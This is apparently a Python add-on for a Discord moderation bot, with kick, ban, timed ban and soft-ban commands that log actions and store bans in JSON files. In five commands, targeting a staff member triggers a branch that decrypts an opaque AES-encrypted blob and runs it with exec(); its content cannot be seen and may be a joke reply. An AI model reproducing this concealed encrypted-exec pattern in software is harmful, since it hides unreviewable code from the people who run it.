import pyaes
import datetime
import discord
import json
import re
import time
from discord.ext import commands
from addons.checks import is_staff

class KickBan:
    """
    Kicking and banning users.
    """
    def __init__(self, bot):
        self.bot = bot
        print('Addon "{}" loaded'.format(self.__class__.__name__))

    @is_staff("HalfOP")
    @commands.command(pass_context=True, name="kick")
    async def kick_member(self, ctx, user, *, reason=""):
        """Kicks a user from the server. Staff only."""
        try:
            try:
                member = ctx.message.mentions[0]
            except IndexError:
                await self.bot.say("Please mention a user.")
                return
            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
                with open("key.bin", "rb") as f:
                    key = f.read(0x20)
                cipher = pyaes.AESModeOfOperationCTR(key)
                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
                # shitty hack but it works
                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
                func = []
                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
                await func[0]
                return
            msg = "You were kicked from {}.".format(self.bot.server.name)
            if reason != "":
                msg += " The given reason is: " + reason
            msg += "\n\nYou are able to rejoin the server, but please read the rules in #welcome-and-rules before participating again."
            try:
                await self.bot.send_message(member, msg)
            except discord.errors.Forbidden:
                pass  # don't fail in case user has DMs disabled for this server, or blocked the bot
            self.bot.actions.append("uk:"+member.id)
            await self.bot.kick(member)
            await self.bot.say("{} is now gone. 👌".format(self.bot.escape_name(member)))
            msg = "👢 **Kick**: {} kicked {} | {}#{}\n🏷 __User ID__: {}".format(ctx.message.author.mention, member.mention, self.bot.escape_name(member.name), member.discriminator, member.id)
            if reason != "":
                msg += "\n✏️ __Reason__: " + reason
            await self.bot.send_message(self.bot.serverlogs_channel, msg)
            await self.bot.send_message(self.bot.modlogs_channel, msg + ("\nPlease add an explanation below. In the future, it is recommended to use `.kick <user> [reason]` as the reason is automatically sent to the user." if reason == "" else ""))
        except discord.errors.Forbidden:
            await self.bot.say("💢 I don't have permission to do this.")

    @is_staff("OP")
    @commands.command(pass_context=True, name="ban")
    async def ban_member(self, ctx, user, *, reason=""):
        """Bans a user from the server. OP+ only."""
        try:
            try:
                member = ctx.message.mentions[0]
            except IndexError:
                await self.bot.say("Please mention a user.")
                return
            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
                with open("key.bin", "rb") as f:
                    key = f.read(0x20)
                cipher = pyaes.AESModeOfOperationCTR(key)
                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
                # shitty hack but it works
                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
                func = []
                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
                await func[0]
                return
            msg = "You were banned from {}.".format(self.bot.server.name)
            if reason != "":
                msg += " The given reason is: " + reason
            msg += "\n\nThis ban does not expire."
            try:
                await self.bot.send_message(member, msg)
            except discord.errors.Forbidden:
                pass  # don't fail in case user has DMs disabled for this server, or blocked the bot
            self.bot.actions.append("ub:"+member.id)
            await self.bot.ban(member, 0)
            await self.bot.say("{} is now b&. 👍".format(self.bot.escape_name(member)))
            msg = "⛔ **Ban**: {} banned {} | {}#{}\n🏷 __User ID__: {}".format(ctx.message.author.mention, member.mention, self.bot.escape_name(member.name), member.discriminator, member.id)
            if reason != "":
                msg += "\n✏️ __Reason__: " + reason
            await self.bot.send_message(self.bot.serverlogs_channel, msg)
            await self.bot.send_message(self.bot.modlogs_channel, msg + ("\nPlease add an explanation below. In the future, it is recommended to use `.ban <user> [reason]` as the reason is automatically sent to the user." if reason == "" else ""))
        except discord.errors.Forbidden:
            await self.bot.say("💢 I don't have permission to do this.")

    @is_staff("OP")
    @commands.command(pass_context=True, name="silentban", hidden=True)
    async def silentban_member(self, ctx, user, *, reason=""):
        """Bans a user from the server, without a notification. OP+ only."""
        try:
            try:
                member = ctx.message.mentions[0]
            except IndexError:
                await self.bot.say("Please mention a user.")
                return
            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
                with open("key.bin", "rb") as f:
                    key = f.read(0x20)
                cipher = pyaes.AESModeOfOperationCTR(key)
                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
                # shitty hack but it works
                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
                func = []
                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
                await func[0]
                return
            self.bot.actions.append("ub:"+member.id)
            await self.bot.ban(member, 0)
            await self.bot.say("{} is now b&. 👍".format(self.bot.escape_name(member)))
            msg = "⛔ **Silent ban**: {} banned {} | {}#{}\n🏷 __User ID__: {}".format(ctx.message.author.mention, member.mention, self.bot.escape_name(member.name), member.discriminator, member.id)
            if reason != "":
                msg += "\n✏️ __Reason__: " + reason
            await self.bot.send_message(self.bot.serverlogs_channel, msg)
            await self.bot.send_message(self.bot.modlogs_channel, msg + ("\nPlease add an explanation below. In the future, it is recommended to use `.silentban <user> [reason]`." if reason == "" else ""))
        except discord.errors.Forbidden:
            await self.bot.say("💢 I don't have permission to do this.")

    @is_staff("OP")
    @commands.command(pass_context=True, name="timeban")
    async def timeban_member(self, ctx, user, length, *, reason=""):
        """Bans a user for a limited period of time. OP+ only.\n\nLength format: #d#h#m#s"""
        try:
            member = ctx.message.mentions[0]
        except IndexError:
            await self.bot.say("Please mention a user.")
            return
        if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
            enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
            with open("key.bin", "rb") as f:
                key = f.read(0x20)
            cipher = pyaes.AESModeOfOperationCTR(key)
            await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
            # shitty hack but it works
            lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
                     b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
                     b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
                     b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
                     b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
                     b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
                     b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
                     b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
                     b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
                     b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
            func = []
            cipher = pyaes.AESModeOfOperationCTR(key[::-1])
            exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
            await func[0]
            return
        issuer = ctx.message.author
        # thanks Luc#5653
        units = {
            "d": 86400,
            "h": 3600,
            "m": 60,
            "s": 1
        }
        seconds = 0
        match = re.findall("([0-9]+[smhd])", length)  # Thanks to 3dshax server's former bot
        if match is None:
            return None
        for item in match:
            seconds += int(item[:-1]) * units[item[-1]]
        timestamp = datetime.datetime.now()
        delta = datetime.timedelta(seconds=seconds)
        unban_time = timestamp + delta
        unban_time_string = unban_time.strftime("%Y-%m-%d %H:%M:%S")
        with open("data/timebans.json", "r") as f:
            timebans = json.load(f)
        timebans[member.id] = unban_time_string
        self.bot.timebans[member.id] = [member, unban_time, False]  # last variable is "notified", for <=30 minute notifications
        with open("data/timebans.json", "w") as f:
            json.dump(timebans, f)
        msg = "You were banned from {}.".format(self.bot.server.name)
        if reason != "":
            msg += " The given reason is: " + reason
        msg += "\n\nThis ban expires {} {}.".format(unban_time_string, time.tzname[0])
        try:
            await self.bot.send_message(member, msg)
        except discord.errors.Forbidden:
            pass  # don't fail in case user has DMs disabled for this server, or blocked the bot
        self.bot.actions.append("ub:"+member.id)
        await self.bot.ban(member, 0)
        await self.bot.say("{} is now b& until {} {}. 👍".format(self.bot.escape_name(member), unban_time_string, time.tzname[0]))
        msg = "⛔ **Time ban**: {} banned {} until {} | {}#{}\n🏷 __User ID__: {}".format(ctx.message.author.mention, member.mention, unban_time_string, self.bot.escape_name(member.name), member.discriminator, member.id)
        if reason != "":
            msg += "\n✏️ __Reason__: " + reason
        await self.bot.send_message(self.bot.serverlogs_channel, msg)
        await self.bot.send_message(self.bot.modlogs_channel, msg + ("\nPlease add an explanation below. In the future, it is recommended to use `.timeban <user> <length> [reason]` as the reason is automatically sent to the user." if reason == "" else ""))

    @is_staff("OP")
    @commands.command(pass_context=True, name="softban")
    async def softban_member(self, ctx, user, *, reason):
        """Soft-ban a user. OP+ only.\n\nThis "bans" the user without actually doing a ban on Discord. The bot will instead kick the user every time they join. Discord bans are account- and IP-based."""
        try:
            try:
                member = ctx.message.mentions[0]
            except IndexError:
                await self.bot.say("Please mention a user.")
                return
            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
                with open("key.bin", "rb") as f:
                    key = f.read(0x20)
                cipher = pyaes.AESModeOfOperationCTR(key)
                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
                # shitty hack but it works
                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
                func = []
                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
                await func[0]
                return
            issuer = ctx.message.author
            with open("data/softbans.json", "r") as f:
                softbans = json.load(f)
            if member.id not in softbans:
                softbans[member.id] = {}
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            softbans[member.id] = {"name": "{}#{}".format(member.name, member.discriminator), "issuer_id": issuer.id, "issuer_name": issuer.name, "reason": reason, "timestamp": timestamp}
            with open("data/softbans.json", "w") as f:
                json.dump(softbans, f)
            msg = "This account is no longer permitted to participate in {}. The reason is: {}".format(self.bot.server.name, softbans[member.id]["reason"])
            await self.bot.send_message(member, msg)
            await self.bot.kick(member)
            await self.bot.say("{} is now b&. 👍".format(self.bot.escape_name(member)))
            msg = "⛔ **Soft-ban**: {} soft-banned {} | {}#{}\n🏷 __User ID__: {}\n✏️ __Reason__: {}".format(ctx.message.author.mention, member.mention, self.bot.escape_name(member.name), member.discriminator, member.id, reason)
            await self.bot.send_message(self.bot.modlogs_channel, msg)
            await self.bot.send_message(self.bot.serverlogs_channel, msg)
        except discord.errors.Forbidden:
            await self.bot.say("💢 I don't have permission to do this.")

    @is_staff("OP")
    @commands.command(pass_context=True, name="softbanid")
    async def softbanid_member(self, ctx, user_id, *, reason):
        """Soft-ban a user based on ID. OP+ only.\n\nThis "bans" the user without actually doing a ban on Discord. The bot will instead kick the user every time they join. Discord bans are account- and IP-based."""
        issuer = ctx.message.author
        with open("data/softbans.json", "r") as f:
            softbans = json.load(f)
        name = "???"
        if user_id not in softbans:
            softbans[user_id] = {}
        elif softbans[user_id]["name"] != "???":
            name = softbans[user_id]["name"]
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        softbans[user_id] = {"name": name, "issuer_id": issuer.id, "issuer_name": issuer.name, "reason": reason, "timestamp": timestamp}
        with open("data/softbans.json", "w") as f:
            json.dump(softbans, f)
        await self.bot.say("ID {} is now b&. 👍".format(user_id))
        msg = "⛔ **Soft-ban**: {} soft-banned ID {}\n✏️ __Reason__: {}".format(ctx.message.author.mention, user_id, reason)
        await self.bot.send_message(self.bot.modlogs_channel, msg)
        await self.bot.send_message(self.bot.serverlogs_channel, msg)

    @is_staff("OP")
    @commands.command(pass_context=True, name="unsoftban")
    async def unsoftban_member(self, ctx, user_id):
        issuer = ctx.message.author
        """Un-soft-ban a user based on ID. OP+ only."""
        with open("data/softbans.json", "r") as f:
            softbans = json.load(f)
        if user_id not in softbans:
            await self.bot.say("{} is not soft-banned!".format(user_id))
            return
        name = softbans[user_id]["name"]
        softbans.pop(user_id)
        with open("data/softbans.json", "w") as f:
            json.dump(softbans, f)
        await self.bot.say("{} has been unbanned!".format(self.bot.escape_name(name) if name != "???" else user_id))
        msg = "⚠️ **Un-soft-ban**: {} un-soft-banned {}".format(issuer.mention, self.bot.escape_name(name) if name != "???" else "ID {}".format(user_id))
        await self.bot.send_message(self.bot.modlogs_channel, msg)

    @is_staff("HalfOP")
    @commands.command()
    async def listsoftbans(self, user_id=""):
        """List soft bans. Shows all if an ID is not specified."""
        with open("data/softbans.json", "r") as f:
            softbans = json.load(f)
        embed = discord.Embed(color=discord.Color.dark_red())
        if user_id == "":
            embed.title = "All soft bans"
            for softban in softbans:
                # sorry this is garbage
                embed.add_field(
                    name=self.bot.escape_name(softbans[softban]["name"]) if softbans[softban]["name"] != "???" else softban,
                    value="{}Issuer: {}\nTime: {}\nReason: {}".format(
                        "" if softbans[softban]["name"] == "???" else "ID: {}\n".format(softban),
                        self.bot.escape_name(softbans[softban]["issuer_name"]),
                        softbans[softban]["timestamp"],
                        softbans[softban]["reason"]
                    )
                )
        else:
            if user_id in softbans:
                embed.title = self.bot.escape_name(softbans[user_id]["name"]) if softbans[user_id]["name"] != "???" else user_id
                embed.description = "{}Issuer: {}\nTime: {}\nReason: {}".format(
                    "" if softbans[user_id]["name"] == "???" else "ID: {}\n".format(user_id),
                    self.bot.escape_name(softbans[user_id]["issuer_name"]),
                    softbans[user_id]["timestamp"],
                    softbans[user_id]["reason"]
                )
            else:
                embed.color = discord.Color.green()
                embed.title = user_id
                embed.description = "ID is not banned!"
        await self.bot.say(embed=embed)

def setup(bot):
    bot.add_cog(KickBan(bot))
